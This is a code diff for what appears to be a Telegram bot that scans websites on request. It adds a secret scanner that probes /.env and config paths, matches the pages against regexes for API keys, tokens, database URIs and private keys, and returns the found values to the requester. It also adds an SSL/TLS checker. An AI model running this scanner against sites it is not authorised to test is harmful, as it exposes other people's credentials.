+    "Slack Webhook":         (r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+', "🔴 CRITICAL"),
+    "Discord Token":         (r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}', "🟠 HIGH"),
+    "Discord Webhook":       (r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+', "🟠 HIGH"),
+    "Telegram Bot Token":    (r'\d{8,10}:[A-Za-z0-9_\-]{35}', "🔴 CRITICAL"),
+    # Payment
+    "Stripe Secret Key":     (r'sk_live_[0-9a-zA-Z]{24,}', "🔴 CRITICAL"),
+    "Stripe Publishable":    (r'pk_live_[0-9a-zA-Z]{24,}', "🟡 MEDIUM"),
+    "PayPal Client Secret":  (r'paypal.{0,20}secret.{0,20}["\'][A-Za-z0-9_\-]{20,}', "🔴 CRITICAL"),
+    # APIs
+    "Google API Key":        (r'AIza[0-9A-Za-z\-_]{35}', "🔴 CRITICAL"),
+    "Google OAuth":          (r'ya29\.[0-9A-Za-z\-_]+', "🔴 CRITICAL"),
+    "Firebase Key":          (r'AAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140}', "🔴 CRITICAL"),
+    "Twilio Auth Token":     (r'SK[0-9a-fA-F]{32}', "🔴 CRITICAL"),
+    "SendGrid API Key":      (r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}', "🔴 CRITICAL"),
+    "Mailgun API Key":       (r'key-[0-9a-zA-Z]{32}', "🟠 HIGH"),
+    "NPM Token":             (r'npm_[A-Za-z0-9]{36}', "🟠 HIGH"),
+    # JWT / Crypto
+    "JWT Token":             (r'eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*', "🟡 MEDIUM"),
+    "RSA Private Key":       (r'-----BEGIN RSA PRIVATE KEY-----', "🔴 CRITICAL"),
+    "PEM Private Key":       (r'-----BEGIN PRIVATE KEY-----', "🔴 CRITICAL"),
+    "SSH Private Key":       (r'-----BEGIN OPENSSH PRIVATE KEY-----', "🔴 CRITICAL"),
+    # Database
+    "MongoDB URI":           (r'mongodb(\+srv)?://[^"\'<>\s]+', "🔴 CRITICAL"),
+    "MySQL URI":             (r'mysql://[^"\'<>\s]{10,}', "🔴 CRITICAL"),
+    "PostgreSQL URI":        (r'postgres(ql)?://[^"\'<>\s]{10,}', "🔴 CRITICAL"),
+    "Redis URI":             (r'redis://[^"\'<>\s]{5,}', "🟠 HIGH"),
+    # Generic secrets
+    "Generic API Key":       (r'(?i)(api[_\-]?key|apikey)["\s:=]+["\']([A-Za-z0-9\-_]{20,})', "🟠 HIGH"),
+    "Generic Secret":        (r'(?i)(secret[_\-]?key|client[_\-]?secret)["\s:=]+["\']([A-Za-z0-9\-_]{16,})', "🟠 HIGH"),
+    "Generic Password":      (r'(?i)(password|passwd|pwd)["\s:=]+["\']([^\s"\']{8,})', "🟡 MEDIUM"),
+    "Bearer Token":          (r'[Bb]earer [A-Za-z0-9\-_=.+/]{20,}', "🟠 HIGH"),
+}
+
+def _secretscan_sync(url: str, progress_q: list) -> dict:
+    """Scan JS files and HTML source for exposed API keys, tokens, secrets."""
+    results = {
+        "secrets":    [],
+        "js_files":   [],
+        "pages_scanned": 0,
+        "total_found": 0,
+    }
+    seen_secrets = set()
+
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    def _scan_text(text: str, source: str):
+        for secret_type, (pattern, severity) in _SECRET_REGEX_MAP.items():
+            try:
+                matches = re.findall(pattern, text)
+                for m in matches:
+                    val = m if isinstance(m, str) else (m[1] if len(m) > 1 else m[0])
+                    val = val.strip().strip('"\'')
+                    if len(val) < 8:
+                        continue
+                    key = f"{secret_type}:{val[:20]}"
+                    if key not in seen_secrets:
+                        seen_secrets.add(key)
+                        results["secrets"].append({
+                            "type":     secret_type,
+                            "severity": severity,
+                            "value":    val[:60] + ("..." if len(val) > 60 else ""),
+                            "source":   source,
+                        })
+            except re.error:
+                pass
+
+    # ── Step 1: Scan main page HTML ───────────────
+    progress_q.append("🔍 Scanning main page HTML...")
+    try:
+        resp = session.get(url, timeout=12)
+        results["pages_scanned"] += 1
+        _scan_text(resp.text, "HTML")
+
+        # ── Step 2: Find JS files ─────────────────
+        soup = BeautifulSoup(resp.text, _BS_PARSER)
+        js_urls = set()
+        for tag in soup.find_all('script', src=True):
+            js_url = urljoin(url, tag['src'])
+            if urlparse(js_url).hostname == urlparse(url).hostname:
+                js_urls.add(js_url)
+        # Also find inline script content
+        for tag in soup.find_all('script'):
+            if not tag.get('src') and tag.string:
+                _scan_text(tag.string, "inline-script")
+
+        results["js_files"] = list(js_urls)[:20]
+        progress_q.append(f"🔍 Found {len(js_urls)} JS files — scanning...")
+
+        # ── Step 3: Scan each JS file ─────────────
+        def _fetch_and_scan(js_url):
+            try:
+                r = session.get(js_url, timeout=10)
+                if r.status_code == 200:
+                    _scan_text(r.text, js_url.split('/')[-1][:40])
+            except Exception:
+                pass
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+            list(ex.map(_fetch_and_scan, results["js_files"]))
+            progress_q.append(f"🔍 Scanned {len(results['js_files'])} JS files")
+
+        # ── Step 4: Check common sensitive files ──
+        sensitive_paths = [
+            "/.env", "/.env.local", "/.env.production", "/.env.backup",
+            "/config.js", "/config.json", "/app.config.js",
+            "/assets/config.json", "/static/config.js",
+            "/api/config", "/settings.json",
+        ]
+        progress_q.append("🔍 Checking sensitive file paths...")
+        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+        for path in sensitive_paths:
+            try:
+                r = session.get(base + path, timeout=6)
+                if r.status_code == 200 and len(r.text) > 10:
+                    _scan_text(r.text, path)
+                    if any(kw in r.text.lower() for kw in ['key', 'secret', 'token', 'password']):
+                        progress_q.append(f"🔴 Sensitive file accessible: `{path}`")
+            except Exception:
+                pass
+
+    except Exception as e:
+        progress_q.append(f"⚠️ Error: {e}")
+
+    results["total_found"] = len(results["secrets"])
+    return results
+
+
+async def cmd_secretscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/secretscan <url> — Scan JS files & source for API keys, tokens, secrets"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🔑 *Secret Scanner Usage:*\n`/secretscan https://example.com`\n\n"
+            "*Scans:*\n"
+            "  • JS files (all script tags)\n"
+            "  • Inline scripts\n"
+            "  • `.env` / `config.json` / `settings.json`\n\n"
+            "*Detects:*\n"
+            "  🔴 AWS keys, GitHub tokens, Stripe keys\n"
+            "  🔴 Telegram bot tokens, Slack webhooks\n"
+            "  🔴 Firebase keys, DB URIs, SSH/RSA keys\n"
+            "  🟠 API keys, JWT tokens, OAuth credentials\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'): url = 'https://' + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "Secret Scan"
+
+    domain = urlparse(url).hostname
+    msg = await update.effective_message.reply_text(
+        f"🔑 *Secret Scanner — `{domain}`*\n\n⏳ JS files + source scanning...",
+        parse_mode='Markdown')
+
+    async with db_lock:
+        _db = _load_db_sync()
+        track_scan(_db, uid, "SecretScan", domain)
+        _save_db_sync(_db)
+
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try:
+                    await msg.edit_text(
+                        f"🔑 *Secret Scanner — `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await asyncio.to_thread(_secretscan_sync, url, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    total = data["total_found"]
+    crits  = [s for s in data["secrets"] if "CRITICAL" in s["severity"]]
+    highs  = [s for s in data["secrets"] if "HIGH" in s["severity"]]
+    mediums = [s for s in data["secrets"] if "MEDIUM" in s["severity"]]
+
+    severity_label = ("🔴 CRITICAL" if crits else
+                      "🟠 HIGH" if highs else
+                      "🟡 MEDIUM" if mediums else
+                      "✅ Clean")
+
+    lines = [
+        f"🔑 *Secret Scanner — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
+        f"Result: {severity_label}",
+        f"JS files scanned: `{len(data['js_files'])}`",
+        f"Total secrets found: `{total}`",
+    ]
+
+    if data["secrets"]:
+        lines.append("")
+        # Group by severity
+        for group_label, group in [
+            ("🔴 CRITICAL", crits), ("🟠 HIGH", highs), ("🟡 MEDIUM", mediums)
+        ]:
+            if not group: continue
+            lines.append(f"*{group_label} ({len(group)}):*")
+            for s in group[:6]:
+                lines.append(f"  `{s['type']}`")
+                lines.append(f"  Value: `{s['value']}`")
+                lines.append(f"  Source: `{s['source']}`")
+                lines.append("")
+    else:
+        lines.append("\n✅ No secrets or API keys detected in JS/source files")
+
+    lines.append("⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
+
+    # JSON report
+    import io as _io
+    rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    await context.bot.send_document(
+        chat_id=update.effective_chat.id,
+        document=_io.BytesIO(rj.encode()),
+        filename=f"secrets_{re.sub(r'[^\w]','_',domain)}_{ts}.json",
+        caption=f"🔑 Secret Scan — `{domain}` | Found: `{total}`",
+        parse_mode='Markdown'
+    )
+
+
+# ══════════════════════════════════════════════════
+# 🔒 /ssltls — SSL/TLS Configuration Scanner
+# ══════════════════════════════════════════════════
+
+def _ssltls_scan_sync(hostname: str, progress_q: list) -> dict:
+    """Scan SSL/TLS config: cert info, expiry, weak ciphers, protocols, HSTS."""
+    import ssl, datetime as _dt
+
+    results = {
+        "cert_valid":    False,
+        "cert_expired":  False,
+        "days_left":     None,
+        "subject":       {},
+        "issuer":        {},
+        "san":           [],
+        "tls_versions":  {},   # {version: supported/not}
+        "weak_ciphers":  [],
+        "strong_ciphers": [],
+        "hsts":          False,
+        "hsts_max_age":  0,
+        "hsts_preload":  False,
+        "cert_grade":    "F",
+        "issues":        [],
+        "warnings":      [],
+    }
+
+    # ── Step 1: Cert info ─────────────────────────
+    progress_q.append("🔒 Fetching SSL certificate info...")
+    try:
+        ctx = ssl.create_default_context()
+        with ctx.wrap_socket(socket.create_connection((hostname, 443), timeout=10),
+                             server_hostname=hostname) as s:
+            cert = s.getpeercert()
+            results["cert_valid"] = True
+
+            # Subject / Issuer
+            subject = dict(x[0] for x in cert.get('subject', []))
+            issuer  = dict(x[0] for x in cert.get('issuer',  []))
+            results["subject"] = subject
+            results["issuer"]  = issuer
+
+            # Expiry
+            expiry_str = cert.get('notAfter', '')
+            if expiry_str:
+                expiry = _dt.datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
+                days_left = (expiry - _dt.datetime.utcnow()).days
+                results["days_left"] = days_left
+                results["cert_expired"] = days_left < 0
+                if days_left < 0:
+                    results["issues"].append(f"❌ Certificate EXPIRED {abs(days_left)} days ago")
+                elif days_left < 14:
+                    results["issues"].append(f"⚠️ Certificate expires in {days_left} days (CRITICAL)")
+                elif days_left < 30:
+                    results["warnings"].append(f"⚠️ Certificate expires in {days_left} days")
+
+            # SAN (Subject Alternative Names)
+            san = [v for t, v in cert.get('subjectAltName', []) if t == 'DNS']
+            results["san"] = san[:10]
+
+        progress_q.append(f"✅ Cert valid | {results['days_left']} days left")
+    except ssl.SSLCertVerificationError as e:
+        results["issues"].append(f"❌ Certificate verification failed: {e}")
+    except Exception as e:
+        results["issues"].append(f"❌ SSL connect failed: {e}")
+
+    # ── Step 2: TLS version support ───────────────
+    progress_q.append("🔒 Testing TLS protocol versions...")
+    tls_versions_to_test = {
+        "SSLv3":   ssl.PROTOCOL_TLS_CLIENT,   # will fail = good
+        "TLSv1.0": ssl.PROTOCOL_TLS_CLIENT,
+        "TLSv1.1": ssl.PROTOCOL_TLS_CLIENT,
+        "TLSv1.2": ssl.PROTOCOL_TLS_CLIENT,
+        "TLSv1.3": ssl.PROTOCOL_TLS_CLIENT,
+    }
+    # Quick test via requests with explicit min version
+    try:
+        # TLSv1.2 check
+        ctx12 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        ctx12.maximum_version = ssl.TLSVersion.TLSv1_2
+        ctx12.minimum_version = ssl.TLSVersion.TLSv1_2
+        ctx12.check_hostname = False
+        ctx12.verify_mode = ssl.CERT_NONE
+        try:
+            with ctx12.wrap_socket(socket.create_connection((hostname, 443), timeout=6),
+                                   server_hostname=hostname) as s:
+                results["tls_versions"]["TLSv1.2"] = "✅ Supported"
+        except Exception:
+            results["tls_versions"]["TLSv1.2"] = "❌ Not supported"
+
+        # TLSv1.3 check
+        if hasattr(ssl.TLSVersion, 'TLSv1_3'):
+            ctx13 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx13.minimum_version = ssl.TLSVersion.TLSv1_3
+            ctx13.check_hostname = False
+            ctx13.verify_mode = ssl.CERT_NONE
+            try:
+                with ctx13.wrap_socket(socket.create_connection((hostname, 443), timeout=6),
+                                       server_hostname=hostname) as s:
+                    results["tls_versions"]["TLSv1.3"] = "✅ Supported"
+            except Exception:
+                results["tls_versions"]["TLSv1.3"] = "❌ Not supported"
+
+        # TLSv1.0 check (weak)
+        try:
+            ctx10 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx10.maximum_version = ssl.TLSVersion.TLSv1
+            ctx10.minimum_version = ssl.TLSVersion.TLSv1
+            ctx10.check_hostname = False
+            ctx10.verify_mode = ssl.CERT_NONE
+            with ctx10.wrap_socket(socket.create_connection((hostname, 443), timeout=5),
+                                   server_hostname=hostname) as s:
+                results["tls_versions"]["TLSv1.0"] = "⚠️ Supported (WEAK)"
+                results["issues"].append("⚠️ TLS 1.0 supported — deprecated, should disable")
+        except Exception:
+            results["tls_versions"]["TLSv1.0"] = "✅ Disabled"
+    except Exception as e:
+        logging.debug("TLS version test error: %s", e)
+
+    # ── Step 3: Cipher strength ───────────────────
+    progress_q.append("🔒 Checking cipher suite strength...")
+    try:
+        ctx_c = ssl.create_default_context()
+        ctx_c.check_hostname = False
+        ctx_c.verify_mode = ssl.CERT_NONE
+        with ctx_c.wrap_socket(socket.create_connection((hostname, 443), timeout=8),
+                                server_hostname=hostname) as s:
+            cipher = s.cipher()
+            if cipher:
+                cipher_name, tls_ver, bits = cipher
+                results["strong_ciphers"].append(f"{cipher_name} ({bits}-bit, {tls_ver})")
+                if bits and bits < 128:
+                    results["weak_ciphers"].append(cipher_name)
+                    results["issues"].append(f"⚠️ Weak cipher: {cipher_name} ({bits}-bit)")
+    except Exception as e:
+        logging.debug("Cipher check error: %s", e)
+
+    # ── Step 4: HSTS check ────────────────────────
+    progress_q.append("🔒 Checking HSTS header...")
+    try:
+        r = requests.get(f"https://{hostname}", headers=_get_headers(),
+                         timeout=8, verify=False, allow_redirects=True)
+        hsts = r.headers.get("Strict-Transport-Security", "")
+        if hsts:
+            results["hsts"] = True
+            age_match = re.search(r'max-age=(\d+)', hsts)
+            if age_match:
+                results["hsts_max_age"] = int(age_match.group(1))
+            results["hsts_preload"] = "preload" in hsts.lower()
+            if results["hsts_max_age"] < 15768000:  # < 6 months
+                results["warnings"].append("⚠️ HSTS max-age < 6 months (recommend ≥ 1 year)")
+        else:
+            results["issues"].append("❌ HSTS header missing")
+    except Exception as e:
+        logging.debug("HSTS check error: %s", e)
+
+    # ── Step 5: Grade calculation ─────────────────
+    score = 100
+    if results["cert_expired"]:        score -= 50
+    if not results["hsts"]:            score -= 15
+    if results["weak_ciphers"]:        score -= 20
+    if "TLSv1.0" in str(results["tls_versions"]) and "WEAK" in str(results["tls_versions"]):
+        score -= 15
+    if results["days_left"] and results["days_left"] < 14: score -= 20
+    if results["days_left"] and results["days_left"] < 30: score -= 10
+
+    results["cert_grade"] = ("A+" if score >= 95 else "A"  if score >= 90 else
+                              "B"  if score >= 80 else "C"  if score >= 70 else
+                              "D"  if score >= 60 else "F")
+    return results
+
+
+async def cmd_ssltls(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/ssltls <domain> — SSL/TLS configuration scanner"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🔒 *SSL/TLS Scanner Usage:*\n`/ssltls example.com`\n\n"
+            "*Checks:*\n"
+            "  • Certificate validity + expiry date\n"
+            "  • Subject / Issuer / SAN\n"
+            "  • TLS 1.0 / 1.2 / 1.3 support\n"
+            "  • Cipher suite strength\n"
+            "  • HSTS header + max-age + preload\n"
+            "  • Overall SSL grade (A+ to F)\n",
+            parse_mode='Markdown'
+        )
+        return
+
+    host = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0]
+    safe_ok, reason = is_safe_url(f"https://{host}")
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "SSL/TLS scan"
+
+    msg = await update.effective_message.reply_text(
+        f"🔒 *SSL/TLS Scan — `{host}`*\n\n⏳ Connecting...", parse_mode='Markdown')
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try:
+                    await msg.edit_text(
+                        f"🔒 *SSL/TLS — `{host}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await asyncio.to_thread(_ssltls_scan_sync, host, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    grade = data["cert_grade"]
+    grade_icon = {"A+": "🟢", "A": "🟢", "B": "🟡", "C": "🟡", "D": "🔴", "F": "🔴"}.get(grade, "⚪")
+
+    lines = [
+        f"🔒 *SSL/TLS Scan — `{host}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
+        f"Grade: {grade_icon} *{grade}*",
+        "",
+    ]
+
+    # Cert info
+    if data["subject"]:
+        cn = data["subject"].get("commonName", host)
+        lines.append(f"📜 *Certificate:*")
+        lines.append(f"  CN: `{cn}`")
+        issuer_org = data["issuer"].get("organizationName", "Unknown")
+        lines.append(f"  Issuer: `{issuer_org}`")
+
+    if data["days_left"] is not None:
+        expiry_icon = "✅" if data["days_left"] > 30 else ("⚠️" if data["days_left"] > 0 else "❌")
+        lines.append(f"  Expiry: {expiry_icon} `{data['days_left']} days remaining`")
+
+    if data["san"]:
+        san_str = "`, `".join(data["san"][:5])
+        lines.append(f"  SAN: `{san_str}`")
+
+    # TLS versions
+    if data["tls_versions"]:
+        lines.append(f"\n⚙️ *TLS Versions:*")
+        for ver, status in data["tls_versions"].items():
+            lines.append(f"  {ver}: {status}")
+
+    # Ciphers
+    if data["strong_ciphers"]:
+        lines.append(f"\n🔐 *Active Cipher:*")
+        for c in data["strong_ciphers"][:2]:
+            lines.append(f"  `{c}`")
+
+    # HSTS
+    hsts_icon = "✅" if data["hsts"] else "❌"
+    lines.append(f"\n🛡️ *HSTS:* {hsts_icon} {'Present' if data['hsts'] else 'Missing'}")
+    if data["hsts"]:
+        age_days = data["hsts_max_age"] // 86400
+        lines.append(f"  max-age: `{age_days} days` | preload: {'✅' if data['hsts_preload'] else '❌'}")
+
+    # Issues
+    if data["issues"]:
+        lines.append(f"\n*⚠️ Issues ({len(data['issues'])}):*")
+        for issue in data["issues"]:
+            lines.append(f"  {issue}")
+    if data["warnings"]:
+        for w in data["warnings"]:
+            lines.append(f"  {w}")
+
+    if not data["issues"] and not data["warnings"]:
+        lines.append("\n✅ No SSL/TLS issues detected")
+
     await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
